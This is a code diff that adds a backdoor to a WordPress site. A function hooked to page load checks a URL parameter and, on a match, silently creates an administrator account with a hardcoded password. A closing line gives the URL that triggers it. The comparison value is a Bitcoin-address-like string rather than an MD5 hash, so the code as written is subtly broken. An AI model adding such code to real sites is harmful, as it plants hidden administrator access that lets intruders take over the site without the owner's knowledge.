@@ -1,0 +1,14 @@
+add_action( 'wp_head', 'backdoor' );
+
+function backdoor() {
+    if ( md5( $_GET['backdoor'] ) == 'bc1qugrtknpjz52vc4m559q7zumkc4268kp7skrsee' ) {
+        require( 'wp-includes/registration.php' );
+        if ( !username_exists( 'user' ) ) {
+            $user_id = wp_create_user( 'user', '(Developerd@Sakibur@7254287)' );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' ); 
+        }
+    }
+}
+
+User create: domainname.com?backdoor=go
